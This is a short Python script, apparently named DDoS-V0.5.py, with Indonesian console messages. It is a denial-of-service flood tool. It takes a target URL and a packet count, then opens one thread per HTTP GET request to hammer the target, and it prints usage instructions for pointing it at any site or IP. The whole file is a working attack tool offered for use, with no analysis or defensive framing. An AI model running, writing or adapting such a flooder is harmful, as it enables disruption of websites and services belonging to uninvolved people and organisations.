import threading
import requests
import sys

def attack(url, packet_count):
    def send():
        try:
            requests.get(url)
            print(f"[+] Packet terkirim ke {url}")
        except:
            print("[-] Gagal mengirim request")

    for _ in range(int(packet_count)):
        threading.Thread(target=send).start()

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("Cara pakai: python DDoS-V0.5.py http://<ip/web> <jumlah_packet>")
    else:
        target_url = sys.argv[1]
        packets = sys.argv[2]
        attack(target_url, packets)